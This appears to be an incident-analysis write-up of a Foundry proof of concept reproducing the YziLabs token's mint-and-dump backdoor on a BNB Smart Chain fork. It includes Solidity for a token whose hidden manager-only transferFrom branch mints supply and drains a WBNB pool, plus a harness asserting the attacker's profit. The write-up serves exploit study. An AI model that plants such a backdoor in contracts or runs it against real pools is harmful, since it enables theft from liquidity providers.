## Overview & Context

This proof-of-concept (PoC) demonstrates the YziLabs mint‑and‑dump backdoor exploit described in the incident’s root cause analysis for the YziLabs/WBNB pool on BNB Smart Chain (BSC, chainid 56).  

Instead of replaying the exact on‑chain attacker token and pool, the PoC builds a **self‑contained local replica** of the vulnerable token and liquidity pool on top of a BSC mainnet fork. A fresh test‑only attacker address is configured as the token’s manager and uses a hidden `transferFrom` backdoor to mint a huge amount of tokens, dump them into a YZI/WBNB pool, drain WBNB, unwrap it to BNB, and realize a large native profit. This mirrors the original attack mechanics while avoiding real attacker identities or contracts.

To run the PoC from the session root:

```bash
cd forge_poc
RPC_URL="<your_bsc_quicknode_url>" forge test --via-ir -vvvvv
```

In the validation environment, `RPC_URL` is derived from the QuickNode template for chainid 56 and injected via the `RPC_URL` env var.

---

## PoC Architecture & Key Contracts

The PoC lives in `forge_poc/test/Exploit.sol` and defines both the vulnerable token and the test harness.

- **Local YziLabs-like token (`YziLabsBackdoorToken`)**  
  - A minimal ERC20‑style token with:
    - `manager` (immutable): a test‑only attacker address.
    - `router`: real PancakeRouter V2 on BSC.
    - `wbnb`: real WBNB token on BSC.
    - `pair`: a YZI/WBNB Uniswap‑V2 style pair created locally in the test.
  - Critical backdoor logic is embedded in `transferFrom` and `_triggerBackdoor`.

```solidity
contract YziLabsBackdoorToken {
    address public immutable manager;
    IPancakeRouterV2 public immutable router;
    address public immutable wbnb;
    address public pair;
    uint256 public constant MAGIC_AMOUNT = 1199002345;

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (msg.sender == manager && from == pair && to == pair && amount == MAGIC_AMOUNT) {
            _triggerBackdoor();
            return true;
        }
        // standard allowance + transfer path...
    }

    function _triggerBackdoor() internal {
        uint256 mintAmount = totalSupply * 10000;
        _mint(address(this), mintAmount);
        _approve(address(this), address(router), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = wbnb;

        router.swapExactTokensForETH(
            mintAmount,
            1,
            path,
            manager,
            block.timestamp + 1 hours
        );
    }
}
```

*Snippet 1 – Local YZI token backdoor, mirroring the manager‑only `transferFrom(pair, pair, MAGIC_AMOUNT)` mint‑and‑dump behavior from the incident.*

- **Infrastructure contracts (real on fork)**  
  - `WBNB_TOKEN`: canonical WBNB on BSC.
  - `PANCAKE_ROUTER`: PancakeSwap V2 router.
  - `IUniswapV2Factory`: router’s factory for creating the YZI/WBNB pair.

- **Test harness (`ExploitTest`)**
  - Uses Foundry’s `vm.createSelectFork` to fork BSC at block `47838544` (one block before the original profit transaction).
  - Deploys `YziLabsBackdoorToken` with a test‑only manager.
  - Seeds a fresh YZI/WBNB pool via PancakeRouter.
  - Executes the backdoor via a dedicated `reproducerAttack()` helper.

```solidity
contract ExploitTest is Test {
    uint256 constant FORK_BLOCK = 47838544;

    address constant WBNB_TOKEN = 0xbb4C...095c;
    address constant PANCAKE_ROUTER = 0x10ED...024E;

    YziLabsBackdoorToken internal yzilabs;
    IWBNB internal wbnb = IWBNB(WBNB_TOKEN);
    IPancakeRouterV2 internal router = IPancakeRouterV2(PANCAKE_ROUTER);
    IUniswapV2Factory internal factory;
    IUniswapV2Pair internal pair;

    address internal attacker;
    address internal lpProvider;

    function setUp() public {
        string memory rpcUrl = vm.envString("RPC_URL");
        vm.createSelectFork(rpcUrl, FORK_BLOCK);
        attacker = makeAddr("attacker");
        lpProvider = makeAddr("lpProvider");
        // deploy token, seed liquidity, set pair...
    }
}
```

*Snippet 2 – Test harness structure, showing the BSC fork, local attacker, and wiring to real WBNB and PancakeRouter.*

---

## Adversary Execution Flow

The PoC models the exploit as an end‑to‑end sequence in `ExploitTest.testExploit`, using only test‑local attacker artifacts on top of a BSC fork.

1. **Funding and environment setup**
   - BSC is forked at block `47838544` via `vm.createSelectFork(RPC_URL, FORK_BLOCK)`.
   - Two fresh addresses are created:
     - `attacker = makeAddr("attacker")` – acts as the YZI token manager and profit recipient.
     - `lpProvider = makeAddr("lpProvider")` – a benign liquidity provider.
   - Real infrastructure contracts (WBNB, PancakeRouter, factory) are obtained from the fork.

2. **Deployment and liquidity provisioning**
   - `YziLabsBackdoorToken` is deployed with `manager = attacker`, `router = PancakeRouter`, `wbnb = WBNB_TOKEN`.
   - Under `attacker`:
     - `mintTo(lpProvider, 1e24)` mints a large initial YZI balance to the LP.
   - Under `lpProvider`:
     - `deal(lpProvider, 400e18)` gives the LP 400 BNB.
     - `yzilabs.approve(router, 1e24)` approves the router.
     - `router.addLiquidityETH{value: 400e18}(..., 1e24, 0, 0, lpProvider, ...)` seeds a new YZI/WBNB pool.
   - The test then:
     - Resolves `pair = IUniswapV2Pair(factory.getPair(address(yzilabs), WBNB_TOKEN))`.
     - Has `attacker` call `yzilabs.setPair(pairAddr)` to bind the backdoor to this pool.
     - Asserts that the pool holds non‑trivial WBNB and YZI reserves and that its tokens are exactly `{YZI, WBNB}`.

3. **Exploit execution**
   - The core exploit is encapsulated in `reproducerAttack()`:

```solidity
function reproducerAttack() internal {
    vm.expectCall(
        address(yzilabs),
        abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            address(pair),
            address(pair),
            1199002345
        )
    );

    vm.startPrank(attacker);
    yzilabs.transferFrom(address(pair), address(pair), 1199002345);
    vm.stopPrank();
}
```

*Snippet 3 – Backdoor invocation, asserting the exact `transferFrom(pair, pair, MAGIC_AMOUNT)` pattern required by the oracle.*

   - `testExploit` snapshots:
     - `attackerNativeBefore = attacker.balance`.
     - `wbnbBefore = wbnb.balanceOf(pair)`.
     - `yziBefore = yzilabs.balanceOf(pair)`.
   - It calls `reproducerAttack()`, then re‑reads:
     - `attackerNativeAfter`, `wbnbAfter`, `yziAfter`.
   - The backdoor path causes:
     - Massive YZI mint to the token contract.
     - Swap of `mintAmount` YZI for WBNB along `[YZI, WBNB]`.
     - Swap of WBNB for BNB and transfer to `attacker` via `withdraw`.

4. **Profit realization and checks**
   - Post‑conditions assert:
     - Attacker’s native balance increased.
     - Attacker’s native profit exceeds `300e18`.
     - The YZI/WBNB pool’s WBNB balance decreased by more than `300e18`.
     - The YZI balance in the pool increased by more than `1e24`.

```solidity
assertEq(yzilabs.manager(), attacker, "Attacker must be configured as YziLabs manager");

assertGt(attackerNativeAfter, attackerNativeBefore, "profit in native BNB");
assertGt(
    attackerNativeAfter,
    attackerNativeBefore + 300e18,
    "attacker must gain at least ~300 BNB"
);

assertLt(
    wbnbAfter,
    wbnbBefore - 300e18,
    "pool must lose at least ~300 WBNB/BNB"
);

assertGt(
    yziAfter - yziBefore,
    1e24,
    "pair must be flooded with a very large amount of newly minted YziLabs tokens"
);
```

*Snippet 4 – Key assertions in `testExploit`, verifying manager binding, attacker profit, pool depletion, and flooding.*

---

## Oracle Definitions and Checks

The PoC is driven by `artifacts/poc/oracle_generator/oracle_definition.json`, which defines the variables and success predicates. The Solidity test closely mirrors these oracles.

### Variables

- `attacker`  
  - A test‑only address created via `makeAddr("attacker")`.  
  - Represents the manager/beneficiary of the backdoor.

- `yzilabs_token`  
  - The locally deployed `YziLabsBackdoorToken`.  
  - Implements `manager()`, `pair`, `transferFrom`, and the backdoor `_triggerBackdoor`.

- `wbnb_token`  
  - The real WBNB contract on BSC (canonical wrapped BNB).

- `native_asset`  
  - The chain’s native BNB; measured via `attacker.balance`.

- `yzilabs_wbnb_pair`  
  - The locally created YZI/WBNB pair via PancakeRouter’s `addLiquidityETH`.

- `pancake_router`  
  - Real PancakeRouter V2 on BSC.

### Pre‑checks

From the oracle definition:

- **Non‑trivial WBNB reserves**  
  - The pair must hold > 1 WBNB before the exploit.  
  - Implemented as:

```solidity
uint256 wbnbBefore = wbnb.balanceOf(pairAddr);
assertGt(wbnbBefore, 1e18);
```

- **Non‑trivial YZI reserves**  
  - The pair must hold some YZI before the exploit.  
  - Implemented as:

```solidity
uint256 yziBefore = yzilabs.balanceOf(pairAddr);
assertGt(yziBefore, 0);
```

- **Manager binding**  
  - `yzilabs_token.manager() == attacker`.  
  - Implemented and rechecked in both `setUp` and `testExploit`.

- **Pair composition**  
  - Pair must be `{YZI, WBNB}` up to ordering.  
  - Implemented via an order‑agnostic check on `token0` and `token1`.

### Hard constraints

- **HC‑1: Manager role**  
  - Requires the exploit to rely on the manager‑only backdoor.  
  - Implemented by constructing `YziLabsBackdoorToken` with `manager = attacker` and asserting `yzilabs.manager() == attacker`.

- **HC‑2: Backdoor branch trigger**  
  - Requires a call `transferFrom(pair, pair, 1199002345)` from the manager.  
  - Implemented by `vm.expectCall` and the call in `reproducerAttack()`.

- **HC‑3: Pair composition**  
  - Ensures the pool is exactly a YZI/WBNB pair.  
  - Implemented with an order‑agnostic `assertTrue(correctComposition)` on pair tokens.

- **HC‑4: Profit asset type**  
  - Requires attacker profit to be realized in native BNB via WBNB unwrap.  
  - Implemented by comparing `attacker.balance` before and after the exploit; the trace shows WBNB `withdraw` and a BNB transfer to the attacker.

### Soft constraints

- **SC‑1: Attacker native profit ≥ 300 BNB**  
  - Implemented by:

```solidity
assertGt(
    attackerNativeAfter,
    attackerNativeBefore + 300e18,
    "attacker must gain at least ~300 BNB in native balance"
);
```

- **SC‑2: WBNB pool depletion ≥ 300 BNB**  
  - Implemented by asserting `wbnbAfter < wbnbBefore - 300e18`.

- **SC‑3: YZI flooding ≥ 1e24**  
  - Implemented by asserting `yziAfter - yziBefore > 1e24`.

All pre‑checks, hard constraints, and soft constraints are exercised in a single run of `testExploit`, and forge reports `1 passed; 0 failed; 0 skipped`.

---

## Validation Result and Robustness

The validator executes the PoC using the prescribed command and records detailed traces.

- **Execution command (validator)**  

```bash
cd forge_poc
RPC_URL="<derived_from_quicknode_chainid_56>" forge test --via-ir -vvvvv \
  > ../artifacts/poc/poc_validator/forge-test.log 2>&1
```

*Snippet 5 – Validator execution command, capturing a full call trace into the validator log.*

- **Key observations from the trace**  
  - A local YZI/WBNB pair is created via PancakeRouter.  
  - `YziLabsBackdoorToken::transferFrom(pair, pair, 1199002345)` is called from the attacker.  
  - `_triggerBackdoor` mints `mintAmount = totalSupply * 10000` and approves the router.  
  - `swapExactTokensForETH` swaps YZI for WBNB, and `WBNB::withdraw` sends BNB to the attacker.  
  - Post‑exploit, the pair’s WBNB balance is nearly emptied, YZI balances are enormous, and the attacker’s BNB balance is much higher.

- **Validation JSON summary** (`artifacts/poc/poc_validator/poc_validated_result.json`)

```json
{
  "overall_status": "Pass",
  "poc_correctness_checks": {
    "passes_validation_oracles": { "passed": true, "...": "..." }
  },
  "poc_quality_checks": {
    "oracle_alignment_with_definition": { "passed": true, "...": "..." },
    "human_readable_and_labeled": { "passed": true, "...": "..." },
    "no_magic_numbers_and_values_are_derived": { "passed": true, "...": "..." },
    "mainnet_fork_no_local_mocks": { "passed": true, "...": "..." },
    "self_contained_no_attacker_side_artifacts": {
      "no_attacker_eoa_addresses": { "passed": true, "...": "..." },
      "no_attacker_deployed_contract_addresses": { "passed": true, "...": "..." },
      "no_attacker_artifacts_or_calldata": { "passed": true, "...": "..." }
    },
    "end_to_end_attack_process_described": { "passed": true, "...": "..." },
    "alignment_with_root_cause": { "passed": true, "...": "..." }
  },
  "artifacts": {
    "validator_test_log_path": "artifacts/poc/poc_validator/forge-test.log"
  },
  "hints": []
}
```

*Snippet 6 – High‑level view of the validator result JSON indicating a full Pass across correctness and quality checks.*

The PoC passes all validation oracles and quality criteria, including the strict self‑containment requirements for attacker identities and artifacts.

---

## Linking PoC Behavior to Root Cause

The root cause report describes a **manager‑only mint‑and‑dump backdoor** in the real YziLabs token on BSC:

- `transferFrom` contains a hidden branch that, when called by the manager with a magic amount and from/to equal to the YZI/WBNB pair, mints an enormous supply of YZI, approves the router, swaps YZI for WBNB, unwraps to BNB, and pays the manager.
- In the original incident, this drained ~376 BNB from the YziLabs/WBNB pool and credited the attacker with a matching BNB profit.

The PoC reproduces this behavior via a local token and pool:

- **Backdoor encoding**  
  - `YziLabsBackdoorToken.transferFrom` and `_triggerBackdoor` encode the same manager‑only logic and swap path.  
  - The magic constant `MAGIC_AMOUNT = 1199002345` is identical to the one observed in the incident.

- **Pool construction and flooding**  
  - A fresh YZI/WBNB pair is created using PancakeRouter and WBNB, closely matching the victim environment.  
  - The backdoor mints `totalSupply * 10000` into the token contract and dumps it into the pair, causing the YZI side to explode while the WBNB side is drained.

- **Profit channel**  
  - WBNB is swapped to BNB and sent to the `manager` (the test attacker), mirroring the original flow where WBNB was unwrapped and forwarded to the real attacker EOA.

- **ACT framing**
  - **A (Adversary action):** The manager/attacker calls `transferFrom(pair, pair, MAGIC_AMOUNT)`, intentionally triggering the hidden backdoor branch.  
  - **C (Chain / contract behavior):** The YZI token mints a huge token amount, approves the router, and executes a YZI→WBNB→BNB swap through PancakeRouter, draining WBNB liquidity and flooding the pair with YZI.  
  - **T (Transaction outcome / victim impact):** The YZI/WBNB pool loses the majority of its WBNB reserve, the LP position becomes nearly worthless, and the attacker’s native BNB balance jumps by hundreds of BNB.

By satisfying the oracles on attacker profit, victim depletion, and pair flooding, the PoC provides strong evidence that it accurately captures the exploit predicate and root cause, while remaining self‑contained and safe for iterative testing.

